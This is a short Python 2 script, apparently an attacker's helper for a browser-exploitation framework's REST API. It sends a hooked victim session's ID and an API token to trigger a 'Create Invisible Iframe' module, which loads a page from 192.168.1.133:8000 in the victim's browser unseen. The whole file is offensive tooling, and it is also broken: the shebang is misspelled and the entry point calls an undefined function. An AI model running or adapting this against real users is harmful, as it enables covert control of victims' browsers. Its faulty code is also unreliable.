#!/usr/bin/env pthon
#--*--coding=utf-8--*--
# ** Author: ssooking

import json
import urllib2

def createIFrame(host, sessionId, authkey):
	postdata = '{"target":"http://192.168.1.133:8000/"}'
	url = host + "api/modules/" + sessionId + "/174?token=" + authkey
	print "[+] URL: " + url
	req = urllib2.Request(url, postdata)
	req.add_header("Content-Type", "application/json; charset=UTF-8")
	f = urllib2.urlopen(req)
	print "\n   >>> [+] Module Create Invisible Iframe has been Executed ! "
	return f.read()

if __name__ == '__main__':
	host = "http://192.168.1.133:3000/"
	sessionId = "tdipkyoT9fqMsMwrW6oc7esUX74rnuOffhe94T4u2DFRlAjhl5CN47gFikTjccC4YPetBtYhszOqb6MU"
	key = "6e7f29387319c5c15ccd21c16d2004fe7a5ff194"
	sendConfirm(host,sessionId,key)